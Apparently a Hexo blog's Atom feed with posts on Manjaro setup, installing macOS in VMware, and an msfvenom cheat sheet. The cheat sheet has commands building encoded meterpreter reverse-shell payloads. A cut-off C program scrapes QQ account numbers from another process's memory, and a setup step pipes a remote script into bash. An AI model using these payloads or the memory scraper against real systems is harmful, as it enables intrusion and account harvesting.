@@ -1,0 +1,640 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>颓废风</title>
+  
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="https://www.sysblz.com/"/>
+  <updated>2018-02-21T21:57:17.000Z</updated>
+  <id>https://www.sysblz.com/</id>
+  
+  <author>
+    <name>Wind</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>manjaro 安装配置</title>
+    <link href="https://www.sysblz.com/article/1224499219.html"/>
+    <id>https://www.sysblz.com/article/1224499219.html</id>
+    <published>2018-02-21T21:27:10.000Z</published>
+    <updated>2018-02-21T21:57:17.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="manjaro系统更新"><a href="#manjaro系统更新" class="headerlink" title="manjaro系统更新"></a>manjaro系统更新</h2><h4 id="选择中国最快官方更新源"><a href="#选择中国最快官方更新源" class="headerlink" title="选择中国最快官方更新源"></a>选择中国最快官方更新源</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo pacman-mirrors -c China</div><div class="line">sudo pacman -Syyu</div></pre></td></tr></table></figure>
+<h4 id="安装yaourt"><a href="#安装yaourt" class="headerlink" title="安装yaourt"></a>安装yaourt</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo pacman -S base-devel yaourt</div><div class="line">sudo pacman -Syyu</div><div class="line">sudo pacman -S archlinuxcn-keyring</div></pre></td></tr></table></figure>
+<h4 id="安装常用软件"><a href="#安装常用软件" class="headerlink" title="安装常用软件"></a>安装常用软件</h4><p>安装：vim，git，wget<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo pacman -S vim git wget</div></pre></td></tr></table></figure></p>
+<p>默认的vim不要用，我长用的通用配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash &lt;(curl -fsSL https://git.io/vFUhE)</div></pre></td></tr></table></figure></p>
+<h4 id="添加aur社区源"><a href="#添加aur社区源" class="headerlink" title="添加aur社区源"></a>添加aur社区源</h4><p>修改pacman配置文件/etc/pacman.conf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo vim /etc/pacman.conf</div></pre></td></tr></table></figure></p>
+<p>在最后加上下面配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[archlinuxcn]</div><div class="line">Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch</div></pre></td></tr></table></figure></p>
+<h5 id="开启aria2c多线程加速下载"><a href="#开启aria2c多线程加速下载" class="headerlink" title="开启aria2c多线程加速下载"></a>开启aria2c多线程加速下载</h5><ol>
+<li><p>安装aria2c</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo pacman -S aria2c</div></pre></td></tr></table></figure>
+</li>
+<li><p>修改pacman配置文件/etc/pacman.conf<br>找到Xfercommand修改成如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XferCommand  = /usr/bin/aria2c -x 8 -s 8 --dir $(dirname %o) -o $(basename %o) %u</div></pre></td></tr></table></figure>
+</li>
+<li><p>保存更新系统</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yaourt -Syyua</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="安装输入法"><a href="#安装输入法" class="headerlink" title="安装输入法"></a>安装输入法</h4><p>安装输入sogou输入法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yaourt -S fcitx-im fcitx-configtool fcitx-sogoupinyin</div></pre></td></tr></table></figure></p>
+<p>输入环境添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim ~/.xprofile</div></pre></td></tr></table></figure></p>
+<p>在文件中添加如下配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">export GTK_IM_MODULE=fcitx</div><div class="line">export QT_IM_MODULE=fcitx</div><div class="line">export XMODIFIERS=&quot;@im=fcitx</div></pre></td></tr></table></figure></p>
+<h4 id="安装QQ，微信，网易云音乐"><a href="#安装QQ，微信，网易云音乐" class="headerlink" title="安装QQ，微信，网易云音乐"></a>安装QQ，微信，网易云音乐</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yaourt -S deepin.com.qq.office deepin.com.wechat netease-cloud-music</div></pre></td></tr></table></figure>
+<p>我安装后 微信 QQ 输入法无法用，修改微信后QQ的启动脚步。<br>微信启动脚本：/opt/deepinwine/apps/Deepin-WeChat/run.sh<br>QQ启动脚本：/opt/deepinwine/apps/Deepin-TIM/run.sh<br>在脚本中添加如下配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">export GTK_IM_MODULE=fcitx</div><div class="line">export QT_IM_MODULE=fcitx</div><div class="line">export XMODIFIERS=&quot;@im=fcitx&quot;</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;manjaro系统更新&quot;&gt;&lt;a href=&quot;#manjaro系统更新&quot; class=&quot;headerlink&quot; title=&quot;manjaro系统更新&quot;&gt;&lt;/a&gt;manjaro系统更新&lt;/h2&gt;&lt;h4 id=&quot;选择中国最快官方更新源&quot;&gt;&lt;a href=&quot;#选择中国最快
+    
+    </summary>
+    
+      <category term="学习" scheme="https://www.sysblz.com/categories/learn/"/>
+    
+    
+      <category term="学习" scheme="https://www.sysblz.com/tags/Learn/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>VM安装Mac系统</title>
+    <link href="https://www.sysblz.com/article/1814314744.html"/>
+    <id>https://www.sysblz.com/article/1814314744.html</id>
+    <published>2018-01-02T23:49:00.000Z</published>
+    <updated>2018-01-05T23:49:00.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="VM安装MAC系统"><a href="#VM安装MAC系统" class="headerlink" title="VM安装MAC系统"></a>VM安装MAC系统</h2><p>各类环境测试需求，所以VM成了我电脑常客。最近测试需要苹果系统，可是手上也没有苹果电脑，谁叫我是穷逼啦！<br>VM没办法直接安装Mac系统，国外的大神做了一个VMware Unlock工具解锁VM对Mac系统的支持。</p>
+<blockquote>
+<p>不要问我VM怎么安装</p>
+</blockquote>
+<p>我的系统环境：<br>系统：Windows 10专业版<br>VM版本:VMware Pro 14.1<br>Mac OS:10.13</p>
+<h3 id="下载解锁工具"><a href="#下载解锁工具" class="headerlink" title="下载解锁工具"></a>下载解锁工具</h3><blockquote>
+<p>保持最新解锁工具<a href="https://bit.ly/DownloadUnlocker" rel="external nofollow noopener noreferrer" target="_blank">下载</a><br>上传百度网盘2.1.1版本<a href="https://pan.baidu.com/s/1pLj3knD" rel="external nofollow noopener noreferrer" target="_blank">下载</a> 密码：iapp</p>
+<h4 id="解锁工具安装"><a href="#解锁工具安装" class="headerlink" title="解锁工具安装"></a>解锁工具安装</h4><p>解压后找到win-install文件右键以管理员身份运行</p>
+<h3 id="VM安装Mac系统前设置"><a href="#VM安装Mac系统前设置" class="headerlink" title="VM安装Mac系统前设置"></a>VM安装Mac系统前设置</h3><h5 id="VM设置选项"><a href="#VM设置选项" class="headerlink" title="VM设置选项"></a>VM设置选项</h5><p>图片比较多，每步我都截图了，如果你VM使用熟练直接跳到最后两张图对CPU设置相关</p>
+</blockquote>
+<p><img src="https://ws1.sinaimg.cn/large/006Vguv0gy1fn2q27nadej30e90c8dgg.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Vguv0gy1fn2q5geqs2j30e90c8t8y.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Vguv0gy1fn2qa00c6pj30e90c8q39.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Vguv0gy1fn2qadabz3j30e90c8jrk.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Vguv0gy1fn2qami9hnj30e90c874e.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Vguv0gy1fn2qazgxmtj30e90c8mxh.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Vguv0gy1fn2qbc1di0j30e90c8aac.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Vguv0gy1fn2qbldol8j30e90c80sy.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Vguv0gy1fn2qbv0p9jj30e90c8q33.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Vguv0gy1fn2qc3ss7sj30e90c8q37.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Vguv0gy1fn2qccgxyuj30e90c8mxh.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Vguv0gy1fn2qcltif0j30e90c874f.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Vguv0gy1fn2qcw1m1xj30e90c8aad.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Vguv0gy1fn2qd5zukej30e90c874m.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Vguv0gy1fn2qde7trqj30kp0h6q3k.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Vguv0gy1fn2qdr0212j30kp0h6wf2.jpg" alt=""><br>最后一步是选择你下载的Mac OS系统文件<br>你要下载我安装的版本<a href="https://drive.google.com/file/d/0B9Eqsl9MKX8peTFhM2RSVnJfNFU/view" rel="external nofollow noopener noreferrer" target="_blank">Mac OS 10.13版本下载</a>(这文件在google云盘上不了google下载不了很正常)<br>网上找的10.13.2网盘 <a href="https://pan.baidu.com/s/1qXPhme4" rel="external nofollow noopener noreferrer" target="_blank">网盘地址</a> 密码:bav4</p>
+<h4 id="修改VM配置"><a href="#修改VM配置" class="headerlink" title="修改VM配置"></a>修改VM配置</h4><blockquote>
+<p>找到你设置的位置，在图四的那个位置。找到已.vmx后缀的文件<br>如：我VM命名为macOS 10.13所以文件就是macOS 10.13.vmx<br>右键以记事本本方式打开在最后加入一行smc.version = “0”保存<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">smc.version = &quot;0&quot;</div></pre></td></tr></table></figure></p>
+</blockquote>
+<h3 id="MacOS安装"><a href="#MacOS安装" class="headerlink" title="MacOS安装"></a>MacOS安装</h3><ol>
+<li>如图镜像引导成功<br><img src="https://ws1.sinaimg.cn/large/006Vguv0gy1fn2sloo4ngj30yk0oxwfc.jpg" alt=""></li>
+<li>格式化磁盘<br><img src="https://ws1.sinaimg.cn/large/006Vguv0gy1fn2tozndcxj30yk0oxk22.jpg" alt=""><br>2.1 格式步骤<br><img src="https://ws1.sinaimg.cn/large/006Vguv0gy1fn2tow1n9gj30yk0oxqa0.jpg" alt=""></li>
+<li>关闭磁盘工具后选择安装MacOS</li>
+<li>选择，安装MacOS后一直下一步，选择安装磁盘继续如果没有磁盘关闭后重复第二步格式磁盘。如图<br><img src="https://ws1.sinaimg.cn/large/006Vguv0gy1fn2tue0xqrj30yk0oxjzh.jpg" alt=""></li>
+<li>等待安装完成。</li>
+</ol>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;VM安装MAC系统&quot;&gt;&lt;a href=&quot;#VM安装MAC系统&quot; class=&quot;headerlink&quot; title=&quot;VM安装MAC系统&quot;&gt;&lt;/a&gt;VM安装MAC系统&lt;/h2&gt;&lt;p&gt;各类环境测试需求，所以VM成了我电脑常客。最近测试需要苹果系统，可是手上也没有苹果电
+    
+    </summary>
+    
+      <category term="学习" scheme="https://www.sysblz.com/categories/learn/"/>
+    
+    
+      <category term="学习" scheme="https://www.sysblz.com/tags/Learn/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>msfvenom命令</title>
+    <link href="https://www.sysblz.com/article/1091155903.html"/>
+    <id>https://www.sysblz.com/article/1091155903.html</id>
+    <published>2018-01-01T21:40:00.000Z</published>
+    <updated>2018-01-01T21:40:00.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="msfvenom常用指南"><a href="#msfvenom常用指南" class="headerlink" title="msfvenom常用指南"></a>msfvenom常用指南</h1><p>个人经常使用msfveom命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.78 lport=443 -e x86/shikata_ga_nai -f c -i 6 --smallest</div><div class="line">msfvenom -p windows/meterpreter/reverse_https lhost=192.168.0.78 lport=443 -e x86/shikata_ga_nai -f c -i 6 --smallest</div></pre></td></tr></table></figure></p>
+<h3 id="msfvenom-帮助"><a href="#msfvenom-帮助" class="headerlink" title="msfvenom 帮助"></a>msfvenom 帮助</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">-p, --payload       &lt;payload&gt;     指定Payload</div><div class="line">     --payload-options            列出 payload选项</div><div class="line"> -l, --list          [type]       列出 payloads, encoders, nops, all</div><div class="line"> -n, --nopsled       &lt;length&gt;     添加 payload 下nopsled 大小</div><div class="line"> -f, --format        &lt;format&gt;     指定输出格式</div><div class="line">     --help-formats               列出支持格式</div><div class="line"> -e, --encoder       &lt;encoder&gt;    指定编码器</div><div class="line"> -a, --arch          &lt;arch&gt;       指定结构(x86,x64)</div><div class="line">     --platform      &lt;platform&gt;   payload平台</div><div class="line">     --help-platforms             列出可用平台</div><div class="line"> -s, --space         &lt;length&gt;     设置 payload 大小</div><div class="line">     --encoder-space &lt;length&gt;     设置payload编码器大小默认-s</div><div class="line"> -b, --bad-chars     &lt;list&gt;       设置规避字符。如: &apos;\x00\xff&apos;</div><div class="line"> -i, --iterations    &lt;count&gt;      设置 payload编码几次</div><div class="line"> -c, --add-code      &lt;path&gt;       指定 win32 shellcode 文件</div><div class="line"> -x, --template      &lt;path&gt;       指定可执行文件模板</div><div class="line"> -k, --keep                       保留模板功能，payload已注入线程模式运行</div><div class="line"> -o, --out           &lt;path&gt;       保存文件路径</div><div class="line"> -v, --var-name      &lt;name&gt;       指定输出格式的自定义变量名称</div><div class="line">     --smallest                   生成最小 payload</div><div class="line"> -h, --help                       帮助</div></pre></td></tr></table></figure>
+<h2 id="编码器"><a href="#编码器" class="headerlink" title="编码器"></a>编码器</h2><p>使用比较多的编码器：x86/shikata_ga_nai<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">cmd/echo                      good       Echo Command Encoder</div><div class="line">cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder</div><div class="line">cmd/ifs                       low        Generic $&#123;IFS&#125; Substitution Command Encoder</div><div class="line">cmd/perl                      normal     Perl Command Encoder</div><div class="line">cmd/powershell_base64         excellent  Powershell Base64 Command Encoder</div><div class="line">cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder</div><div class="line">generic/eicar                 manual     The EICAR Encoder</div><div class="line">generic/none                  normal     The &quot;none&quot; Encoder</div><div class="line">mipsbe/byte_xori              normal     Byte XORi Encoder</div><div class="line">mipsbe/longxor                normal     XOR Encoder</div><div class="line">mipsle/byte_xori              normal     Byte XORi Encoder</div><div class="line">mipsle/longxor                normal     XOR Encoder</div><div class="line">php/base64                    great      PHP Base64 Encoder</div><div class="line">ppc/longxor                   normal     PPC LongXOR Encoder</div><div class="line">ppc/longxor_tag               normal     PPC LongXOR Encoder</div><div class="line">sparc/longxor_tag             normal     SPARC DWORD XOR Encoder</div><div class="line">x64/xor                       normal     XOR Encoder</div><div class="line">x64/zutto_dekiru              manual     Zutto Dekiru</div><div class="line">x86/add_sub                   manual     Add/Sub Encoder</div><div class="line">x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder</div><div class="line">x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder</div><div class="line">x86/avoid_underscore_tolower  manual     Avoid underscore/tolower</div><div class="line">x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower</div><div class="line">x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder</div><div class="line">x86/bmp_polyglot              manual     BMP Polyglot</div><div class="line">x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder</div><div class="line">x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder</div><div class="line">x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder</div><div class="line">x86/context_time              manual     time(2)-based Context Keyed Payload Encoder</div><div class="line">x86/countdown                 normal     Single-byte XOR Countdown Encoder</div><div class="line">x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder</div><div class="line">x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder</div><div class="line">x86/nonalpha                  low        Non-Alpha Encoder</div><div class="line">x86/nonupper                  low        Non-Upper Encoder</div><div class="line">x86/opt_sub                   manual     Sub Encoder (optimised)</div><div class="line">x86/service                   manual     Register Service</div><div class="line">x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder</div><div class="line">x86/single_static_bit         manual     Single Static Bit</div><div class="line">x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder</div><div class="line">x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder</div></pre></td></tr></table></figure></p>
+<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><h4 id="文件模式格式"><a href="#文件模式格式" class="headerlink" title="文件模式格式"></a>文件模式格式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war</div></pre></td></tr></table></figure>
+<h4 id="转换格式"><a href="#转换格式" class="headerlink" title="转换格式"></a>转换格式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript</div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;msfvenom常用指南&quot;&gt;&lt;a href=&quot;#msfvenom常用指南&quot; class=&quot;headerlink&quot; title=&quot;msfvenom常用指南&quot;&gt;&lt;/a&gt;msfvenom常用指南&lt;/h1&gt;&lt;p&gt;个人经常使用msfveom命令&lt;br&gt;&lt;figure cla
+    
+    </summary>
+    
+      <category term="学习" scheme="https://www.sysblz.com/categories/learn/"/>
+    
+    
+      <category term="学习" scheme="https://www.sysblz.com/tags/Learn/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>进程查找QQ号码</title>
+    <link href="https://www.sysblz.com/article/105276810.html"/>
+    <id>https://www.sysblz.com/article/105276810.html</id>
+    <published>2017-12-19T11:19:00.000Z</published>
+    <updated>2017-12-19T11:19:00.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="进程抓取QQ号码"><a href="#进程抓取QQ号码" class="headerlink" title="进程抓取QQ号码"></a>进程抓取QQ号码</h2><p>前天翻硬盘的时候，不知道什么时候写的一个C语言版本的通过进程抓取内存关键后面的QQ号码<br>原理很简单:</p>
+<ol>
+<li>获取系统所有进程，查找QQ进程ID。</li>
+<li>通过进程ID获取应用的内存空间。</li>
+<li>根据内存关键字查找关键字后面的QQ号码。</li>
+</ol>
+<p><img src="https://ws1.sinaimg.cn/large/006VAXiDgy1fmlx6bcz2sj30r70d6mx1.jpg" alt=""></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tlhelp32.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="comment">//#include &lt;iostream.h&gt;</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetQQ</span><span class="params">(DWORD dwQQID)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	PROCESSENTRY32 pe;</div><div class="line">	DWORD id = <span class="number">0</span>;</div><div class="line">	DWORD ids[<span class="number">5</span>];</div><div class="line">	<span class="keyword">int</span> idleng =<span class="number">0</span>;</div><div class="line">	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,<span class="number">0</span>);</div><div class="line">	pe.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</div><div class="line">	<span class="keyword">if</span>( !Process32First(hSnapshot,&amp;pe) )</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line">	<span class="keyword">do</span></div><div class="line">	&#123;</div><div class="line">		pe.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</div><div class="line">		<span class="keyword">if</span>( Process32Next(hSnapshot,&amp;pe)==FALSE )</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		<span class="keyword">if</span>(<span class="built_in">strcmp</span>(pe.szExeFile,<span class="string">"QQ.exe"</span>) == <span class="number">0</span>)</div><div class="line">		&#123;</div><div class="line"></div><div class="line">			ids[idleng] =pe.th32ProcessID;</div><div class="line">			idleng++;</div><div class="line">			<span class="comment">//break;</span></div><div class="line">		&#125;</div><div class="line"></div><div class="line">	&#125; <span class="keyword">while</span>(<span class="number">1</span>);</div><div class="line"></div><div class="line">	CloseHandle(hSnapshot);</div><div class="line"></div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;idleng;k++)</div><div class="line">	&#123;</div><div class="line"></div><div class="line">		GetQQ(ids[k]);</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line">	getchar();</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetQQ</span><span class="params">(DWORD dwQQID)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"></div><div class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwQQID); <span class="comment">//打开进程</span></div><div class="line"></div><div class="line"></div><div class="line">	<span class="keyword">if</span> (hProcess !=<span class="literal">NULL</span>)</div><div class="line">	&#123;</div><div class="line">		SuspendThread(hProcess);</div><div class="line"></div><div class="line">		DWORD dwBaseAddress;</div><div class="line">		MEMORY_BASIC_INFORMATION mbi;</div><div class="line">		<span class="keyword">char</span>   process_mem[ <span class="number">4096</span> ]  =   &#123; <span class="number">0</span> &#125; ;</div><div class="line">		DWORD number_of_bytes_read  =   <span class="number">0</span> ;</div><div class="line">		SYSTEM_INFO si;</div><div class="line">		GetSystemInfo( &amp; si);</div><div class="line">		<span class="keyword">int</span> s =<span class="number">0</span>;</div><div class="line">		<span class="keyword">char</span> strqqlent[<span class="number">50</span>];</div><div class="line">		<span class="keyword">char</span> GetQQKey[] =<span class="string">"\\Msg3.0.db"</span>;</div><div class="line"></div><div class="line">		dwBaseAddress  =  (DWORD)si.lpMinimumApplicationAddress;</div><div class="line">		<span class="keyword">while</span> (dwBaseAddress  &lt;  (DWORD)si.lpMaximumApplicationAddress)</div><div class="line">		&#123;</div><div class="line">			mbi.BaseAddress  =  (LPVOID)dwBaseAddress;</div><div class="line">			VirtualQueryEx(hProcess, (LPVOID)dwBaseAddress,  &amp; mbi,  <span class="keyword">sizeof</span> (mbi));</div><div class="line">			dwBaseAddress  =  (DWORD)mbi.BaseAddress  +  mbi.RegionSize;</div><div class="line">			<span class="keyword">if</span> (mbi.State  !=  MEM_COMMIT  ||  mbi.AllocationProtect  !=  PAGE_READWRITE)  <span class="comment">// 跳过未分配或不可读写的区域</span></div><div class="line">			&#123;</div><div class="line">				<span class="keyword">continue</span> ;</div><div class="line">			&#125;</div><div class="line"></div><div class="line">			<span class="comment">// 搜索</span></div><div class="line">			<span class="keyword">for</span> (DWORD i  =  (DWORD)mbi.BaseAddress; i  &lt;  dwBaseAddress; i += <span class="number">4096</span> )</div><div class="line">			&#123;</div><div class="line">				<span class="keyword">if</span> ( ! ReadProcessMemory(hProcess,LPCVOID(i),process_mem, <span class="number">4096</span> , &amp; number_of_bytes_read))</div><div class="line">					<span class="keyword">break</span> ;</div><div class="line">				<span class="keyword">for</span> ( <span class="keyword">int</span>  j = <span class="number">0</span> ;j &lt; <span class="number">4096</span>   -   <span class="keyword">sizeof</span>(GetQQKey) ;j ++ )</div><div class="line">				&#123;</div><div class="line">					<span class="keyword">if</span>(s &gt;<span class="number">4</span>)</div><div class="line">					&#123;</div><div class="line">						ResumeThread(hProcess);</div><div class="line">						<span class="keyword">static</span> <span class="keyword">char</span> strQQ[<span class="number">50</span>];</div><div class="line">						<span class="keyword">for</span>(<span class="keyword">int</span> m=<span class="number">0</span>;m&lt;s;m++)</div><div class="line">						&#123;</div><div class="line">							strQQ[m] = strqqlent[s-m<span class="number">-1</span>];</div><div class="line">						&#125;</div><div class="line">						<span class="built_in">printf</span>(<span class="string">"已经发现QQ号:%s\n"</span>,strQQ);</div><div class="line">						<span 